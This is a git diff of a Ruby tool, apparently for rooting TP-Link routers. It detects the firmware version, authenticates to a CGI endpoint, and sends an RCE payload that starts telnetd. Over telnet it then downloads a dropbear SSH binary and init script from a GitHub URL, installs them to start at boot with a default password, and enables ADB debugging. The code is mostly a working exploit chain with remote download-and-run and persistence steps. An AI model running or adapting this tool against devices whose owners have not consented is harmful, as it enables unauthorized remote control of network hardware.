@@ -8,8 +8,120 @@ class TPown
     attr_accessor :options
 
     def initialize
-        @options = {}
+        @options = {
+        }
     end
+
+    
+    def detect_version
+        
+        if @options[:rce] == 1 || detect_v1
+            @options[:rce] = 1
+            @options[:cgi_path] = "qcmap_auth"
+            puts "[ok] Detected v1"
+        elsif @options[:rce] == 5 || detect_v5
+            @options[:rce] = 5
+            @options[:cgi_path] = "auth_cgi"
+            puts "[ok] Detected v5"
+        else
+            raise "No suitable RCE found"
+        end
+    end
+
+    def cleanup
+        cleanup_v1 if @options[:rce] == 1
+        cleanup_v5 if @options[:rce] == 5
+    end
+
+    def payload
+        payload_v1 if @options[:rce] == 1
+        payload_v5 if @options[:rce] == 5
+    end
+
+    def connect_telnet()
+        puts "Connecting to telnetd"
+        @client = Net::Telnet::new("Host" => @options[:target], "Prompt" => /\/ # \z/n, "Timeout" => 10, "Telnetmode" => true, "Waittime" => 0.3)
+        
+    end
+
+    def cmd(c)
+        connect_telnet if @client.nil? 
+        data = ""
+        @client.cmd(c) do |c|
+            data += c
+        end
+
+        return data
+    end
+
+    def ping_telnet()
+        puts "Testing telnet connection"
+        puts cmd("uname -a")
+    end
+
+    def login()
+        
+        login_data = {"module": "authenticator", "action": 0}.to_json
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/#{@options[:cgi_path]}", login_data) do |http|
+            http.headers["Content-Type"] = "application/json"
+        end
+
+        data = JSON.parse(res.body)
+ 
+
+        
+        nonce = data["nonce"].to_s
+
+        digest = ::OpenSSL::Digest::MD5.hexdigest(@options[:pass] + ":" + nonce)
+
+        login_data = {"module": "authenticator", "action": 1, "digest": digest}.to_json
+
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/#{@options[:cgi_path]}", login_data) do |http|
+            http.headers["Content-Type"] = "application/json"
+        end
+        data = JSON.parse(res.body)
+        if data["authedIP"].nil? or data["authedIP"].to_s == ""
+            raise("Wrong password?")
+        end
+
+        puts "[ok] Logged in from #{data["authedIP"]}"
+        @options[:source] = data["authedIP"].to_s
+        @options[:token] = data["token"]
+        return true
+
+    end
+
+    def install_ssh
+        puts "Downloading dropbear server and init from #{@options[:dropbear_bin]} and #{@options[:dropbear_init]}"
+
+        cmd("test -f /usr/sbin/dropbearmulti || wget -O /usr/sbin/dropbearmulti #{@options[:dropbear_bin]}")
+        cmd("test -f /etc/init.d/dropbearserver || wget -O /etc/init.d/dropbearserver #{@options[:dropbear_init]}")
+        cmd("chmod +x /etc/init.d/dropbearserver /usr/sbin/dropbearmulti")
+        cmd("ln -sv ../init.d/dropbearserver /etc/rc0.d/K77dropbear")
+        cmd("ln -sv ../init.d/dropbearserver /etc/rcS.d/S77dropbear")
+        
+        data = cmd("md5sum /usr/sbin/dropbearmulti")
+        if data.match(/c83b037cb48139035b5975d3f3841c70/)
+            cmd("/etc/init.d/dropbearserver start")
+            puts "Starting dropbear server at #{@options[:target]}. "
+            puts "Default password is oelinux123"
+        else 
+            raise "Wrong checksum of dropbear binary?"
+        end
+
+    end
+
+    def install_adb
+        puts "Enabling adb by default - so you can use adb shell"
+        cmd("uci set usb_enum.enum.mode=debug")
+        cmd("usb_enum.enum.debug_pid=902B")
+        cmd("echo 902B > /sbin/usb/compositions/hsusb_next")
+        cmd("uci commit usb_enum")
+
+
+    end
+
+    private
 
     def payload_v1
         payload_data = {
@@ -27,7 +139,7 @@ class TPown
         end
         p res.body
        
-        cleanup_v1
+
     
     end
 
@@ -70,7 +182,7 @@ class TPown
             raise "Error setting up payload?"
         end
 
-        puts "[ok] Sent telnetd payload"
+        puts "[ok] Sent telnetd payload v5"
 
 
         
@@ -92,92 +204,31 @@ class TPown
         if data["result"] != 0
             puts "Error deleting payload - may be safe to ignore"
         else 
-            puts "[ok] Deleted payload"
+            puts "[ok] Deleted payload v5"
         end
 
     end
 
-    def connect_telnet()
-        puts "Connecting to telnetd"
-        @client = Net::Telnet::new("Host" => @options[:target], "Prompt" => /\/ # \z/n, "Timeout" => 10, "Telnetmode" => true, "Waittime" => 0.3)
-        
-    end
-
-    def cmd(c)
-        connect_telnet if @client.nil? 
-        data = ""
-        @client.cmd(c) do |c|
-            data += c
-        end
-
-        return data
-    end
-
-
-    def login(cgi_path)
-
+    def detect_v1
         login_data = {"module": "authenticator", "action": 0}.to_json
-        res = Curl.post("http://#{@options[:target]}/cgi-bin/#{cgi_path}", login_data) do |http|
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/qcmap_auth", login_data) do |http|
             http.headers["Content-Type"] = "application/json"
         end
-
-        data = JSON.parse(res.body)
- 
-
         
-        nonce = data["nonce"].to_s
+        return false if res.code == 404
+        return true if res.code == 200
+        return nil
+    end
 
-        digest = ::OpenSSL::Digest::MD5.hexdigest(@options[:pass] + ":" + nonce)
-
-        login_data = {"module": "authenticator", "action": 1, "digest": digest}.to_json
-
-        res = Curl.post("http://#{@options[:target]}/cgi-bin/#{cgi_path}", login_data) do |http|
+    def detect_v5
+        login_data = {"module": "authenticator", "action": 0}.to_json
+        res = Curl.post("http://#{@options[:target]}/cgi-bin/auth_cgi", login_data) do |http|
             http.headers["Content-Type"] = "application/json"
         end
-        data = JSON.parse(res.body)
-        if data["authedIP"].nil? or data["authedIP"].to_s == ""
-            raise("Wrong password?")
-        end
-
-        puts "[ok] Logged in from #{data["authedIP"]}"
-        @options[:source] = data["authedIP"].to_s
-        @options[:token] = data["token"]
-        return true
-
-    end
-
-    def install_ssh
-        puts "Downloading dropbearmulti and dropbearserver.sh from https://github.com/ecdsa521/tpown"
-
-        cmd("test -f /usr/sbin/dropbearmulti || wget -O /usr/sbin/dropbearmulti https://raw.githubusercontent.com/ecdsa521/tpown/main/dropbearmulti")
-        cmd("test -f /etc/init.d/dropbearserver || wget -O /etc/init.d/dropbearserver https://raw.githubusercontent.com/ecdsa521/tpown/main/dropbearserver.sh")
-        cmd("chmod +x /etc/init.d/dropbearserver /usr/sbin/dropbearmulti")
-        cmd("ln -sv ../init.d/dropbearserver /etc/rc0.d/K77dropbear")
-        cmd("ln -sv ../init.d/dropbearserver /etc/rcS.d/S77dropbear")
         
-        data = cmd("md5sum /usr/sbin/dropbearmulti")
-        if data.match(/c83b037cb48139035b5975d3f3841c70/)
-            cmd("/etc/init.d/dropbearserver start")
-            puts "Starting dropbear server at #{@options[:target]}. "
-            puts "Default password is oelinux123"
-        else 
-            raise "Wrong checksum of dropbear binary?"
-        end
-
-    end
-
-    def install_adb
-        puts "Enabling adb by default - so you can use adb shell"
-        cmd("uci set usb_enum.enum.mode=debug")
-        cmd("usb_enum.enum.debug_pid=902B")
-        cmd("echo 902B > /sbin/usb/compositions/hsusb_next")
-        cmd("uci commit usb_enum")
-
-
-    end
-
-    def start_server
-
+        return false if res.code == 404
+        return true if res.code == 200
+        return nil
     end
 
 
@@ -186,35 +237,31 @@ end
 
 tp = TPown.new
 
-OptionParser.new do |opts|
-  opts.banner = "Usage: tp.rb [options]"
 
-  opts.on("--ssh", "Install SSH server") do |v|
-    tp.options[:ssh] = v
-  end
+tp.options = Optimist::options do
+    opt :ssh, "Install dropbear SSH server"
+    opt :adb, "Enable ADBD service"
+    opt :keep, "Keep the telnetd payload"
+    opt :pass, "Web interface password", type: String, required: true
+    opt :target, "Target IP", type: String, required: true
+    opt :rce, "RCE version, 1, 5 or try to autodetect if left empty", type: Integer
+    opt :dropbear_bin, "Dropbear binary location", default: "https://raw.githubusercontent.com/ecdsa521/tpown/main/dropbearmulti"
+    opt :dropbear_init, "Dropbear init script location", default: "https://raw.githubusercontent.com/ecdsa521/tpown/main/dropbearserver.sh"
 
-  opts.on("--adb", "Enable ADBD") do |v|
-    tp.options[:adb] = v
-  end
+    educate_on_error
+    
+end
 
-  opts.on("--pass [PASSWORD]", "Web password") do |v|
-    tp.options[:pass] = v
-  end
+tp.detect_version()
+tp.login()
+tp.payload()
+tp.cleanup() unless tp.options[:keep]
+tp.ping_telnet()
 
-  opts.on("-t", "--target [TARGET]", "Target IP") do |v|
-    tp.options[:target] = v
-  end
+tp.install_adb() if tp.options[:adb]
+tp.install_ssh() if tp.options[:ssh]
 
-  opts.on("-5", "Router v5") do |v|
-    tp.options[:version] = 5
-  end
-
-  opts.on("-1", "Router v5") do |v|
-    tp.options[:version] = 1
-  end
-
-end.parse!
-
+exit
 
 
 if tp.options[:version] == 5
